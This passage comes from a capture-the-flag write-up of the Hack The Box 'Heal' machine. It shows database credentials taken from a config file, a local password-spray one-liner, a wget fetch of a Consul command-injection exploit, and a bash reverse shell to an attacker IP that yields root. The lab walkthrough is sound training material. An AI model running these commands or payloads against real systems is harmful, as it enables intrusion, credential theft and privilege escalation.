-rwxr-x---  1 www-data www-data  2691 Sep 27 10:27 config-sample-dblib.php
-rwxr-x---  1 www-data www-data 39410 Sep 27 10:27 config-defaults.php
-rw-r--r--  1 www-data www-data   914 Sep 27 10:35 security.php
-rw-r--r--  1 www-data www-data  3248 Dec  4 08:05 config.php
drwxr-x---  3 www-data www-data  4096 Dec  8 13:57 rest
drwxr-x--- 15 www-data www-data  4096 Dec  8 13:57 ..
drwxr-x---  3 www-data www-data  4096 Dec  8 13:57 .
```

```bash
www-data@heal:~/limesurvey/application/config$ cat config.php
[...]
return array(
        'components' => array(
                'db' => array(
                        'connectionString' => 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;',
                        'emulatePrepare' => true,
                        'username' => 'db_user',
                        'password' => 'AdmiDi0_pA$$w0rd',
                        'charset' => 'utf8',
                        'tablePrefix' => 'lime_',
                ),
[...]
```

### Password spray

```bash
www-data@heal:~/limesurvey/application/config$ PASS='AdmiDi0_pA$$w0rd'; for USER in $(cat /etc/passwd|grep sh$|awk -F: '{print $1}'); do (x=$(echo $PASS | su $USER -c whoami); if [ "$x" ]; then echo "[+] $USER"; fi) & done
[1] 25421
[2] 25422
[3] 25423
[4] 25425
www-data@heal:~/limesurvey/application/config$ Password: Password: Password: Password: [+] ron
```

```bash
www-data@heal:~/limesurvey/application/config$ su - ron
Password:
ron@heal:~$ id
uid=1001(ron) gid=1001(ron) groups=1001(ron)
```

# Root Flag
---


## From ron to root

### Hashicorp Consul 1.0 : RCE

There's an abnormal process `consul` running as root

```bash
ron@heal:~$ ps auxfw5
[...]
root        1019  0.3  2.5 1357156 101084 ?      Ssl  19:09   0:05 /usr/local/bin/consul agent -server -ui -advertise=127.0.0.1 -bind=127.0.0.1 -data-dir=/var/lib/consul -node=consul-01 -config-dir=/etc/consul.d
[...]
```

- Google : `consul exploit`

> The vulnerability exists in the `ServiceID` parameter of the `PUT /v1/agent/service/register` API endpoint. The `ServiceID` parameter is used to register a service with the Consul agent. The `ServiceID` parameter is not sanitized and allows for command injection
{: .prompt-info }

> POC - https://github.com/owalid/consul-rce

![](/assets/obsidian/18e8b92f0817a83010bc051a4b979dc4.png)

Download and host the exploit file

```bash
┌──(bravosec㉿fsociety)-[~/htb/Heal]
└─$ cd exploit

┌──(bravosec㉿fsociety)-[~/htb/Heal/exploit]
└─$ git clone https://github.com/owalid/consul-rce
Cloning into 'consul-rce'...
remote: Enumerating objects: 7, done.
remote: Counting objects: 100% (7/7), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 7 (delta 0), reused 4 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (7/7), done.

┌──(bravosec㉿fsociety)-[~/htb/Heal/exploit]
└─$ cd consul-rce

┌──(bravosec㉿fsociety)-[~/htb/Heal/exploit/consul-rce]
└─$ PORT="80"; fuser -k "$PORT/tcp" 2>/dev/null; simplehttpserver -listen "0.0.0.0:$PORT"
 26187
   _____ _                 __     __  __________________
  / ___/(_)___ ___  ____  / /__  / / / /_  __/_  __/ __ \________  ______   _____  _____
  \__ \/ / __ -__ \/ __ \/ / _ \/ /_/ / / /   / / / /_/ / ___/ _ \/ ___/ | / / _ \/ ___/
 ___/ / / / / / / / /_/ / /  __/ __  / / /   / / / ____(__  )  __/ /   | |/ /  __/ /
/____/_/_/ /_/ /_/ .___/_/\___/_/ /_/ /_/   /_/ /_/   /____/\___/_/    |___/\___/_/
                /_/                                                       - v0.0.6

                projectdiscovery.io

Serving /home/kali/htb/Heal/exploit/consul-rce on http://0.0.0.0:80/
```

```bash
ron@heal:~$ wget http://10.10.14.87/consul_rce.py -O /dev/shm/x.py
--2024-12-19 19:47:51--  http://10.10.14.87/consul_rce.py
Connecting to 10.10.14.87:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2178 (2.1K) [text/x-python]
Saving to: ‘/dev/shm/x.py’

/dev/shm/x.py                                        100%[===================================================================================================================>]   2.13K  --.-KB/s    in 0s

2024-12-19 19:47:51 (214 MB/s) - ‘/dev/shm/x.py’ saved [2178/2178]
```

Start reverse shell listener

```bash
┌──(bravosec㉿fsociety)-[~/htb/Heal]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
```

- Port `8500` from the command example exists on the machine, try that one

```bash
ron@heal:~$ ss -ltnp
State                    Recv-Q                   Send-Q                                     Local Address:Port                                     Peer Address:Port                  Process
LISTEN                   0                        128                                              0.0.0.0:22                                            0.0.0.0:*
LISTEN                   0                        511                                              0.0.0.0:80                                            0.0.0.0:*
LISTEN                   0                        244                                            127.0.0.1:5432                                          0.0.0.0:*
LISTEN                   0                        4096                                       127.0.0.53%lo:53                                            0.0.0.0:*
LISTEN                   0                        511                                            127.0.0.1:3000                                          0.0.0.0:*
LISTEN                   0                        1024                                           127.0.0.1:3001                                          0.0.0.0:*
LISTEN                   0                        4096                                           127.0.0.1:8302                                          0.0.0.0:*
LISTEN                   0                        4096                                           127.0.0.1:8300                                          0.0.0.0:*
LISTEN                   0                        4096                                           127.0.0.1:8301                                          0.0.0.0:*
LISTEN                   0                        4096                                           127.0.0.1:8600                                          0.0.0.0:*
LISTEN                   0                        4096                                           127.0.0.1:8503                                          0.0.0.0:*
LISTEN                   0                        4096                                           127.0.0.1:8500                                          0.0.0.0:*
LISTEN                   0                        128                                                 [::]:22                                               [::]:*
```

```bash
ron@heal:~$ echo 'bash -c "bash -i >& /dev/tcp/10.10.14.87/1111 0>&1"' > /dev/shm/x.sh
ron@heal:~$ python3 /dev/shm/x.py -th 127.0.0.1 -tp 8500 -c 'bash /dev/shm/x.sh'
[+] Check kxcafhwnqvffedb created successfully
[+] Check kxcafhwnqvffedb deregistered successfully
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Heal]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.87] from (UNKNOWN) [10.10.11.46] 33760
bash: cannot set terminal process group (1959): Inappropriate ioctl for device
bash: no job control in this shell
root@heal:/# /usr/bin/script -qc /bin/bash /dev/null
/usr/bin/script -qc /bin/bash /dev/null
root@heal:/# ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/htb/Heal]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111
                               export TERM=xterm
root@heal:/# stty rows 50 columns 209
root@heal:/# id
uid=0(root) gid=0(root) groups=0(root)
root@heal:/# cat /root/root.txt
4f56523929f7fb5a2817fb0e0c42d982
root@heal:/#
```


# Additional
---
